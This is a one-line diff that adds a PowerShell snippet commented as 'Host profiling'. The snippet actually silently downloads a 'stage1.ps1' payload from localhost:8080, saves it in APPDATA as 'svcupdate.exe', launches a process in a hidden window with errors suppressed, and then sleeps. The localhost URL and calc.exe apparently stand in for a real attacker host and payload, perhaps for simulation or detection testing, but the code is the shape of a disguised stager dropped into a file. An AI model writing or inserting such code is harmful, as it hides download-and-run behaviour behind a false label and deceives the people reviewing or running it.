@@ -1,0 +1,1 @@
+<# Host profiling #> $TransferUrl = "https://localhost:8080/stage1.ps1"; $DownloadPath = "$env:APPDATA\svcupdate.exe"; $RequestTimeout = 71; Invoke-WebRequest -Uri $TransferUrl -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue; Start-Sleep -Seconds 34
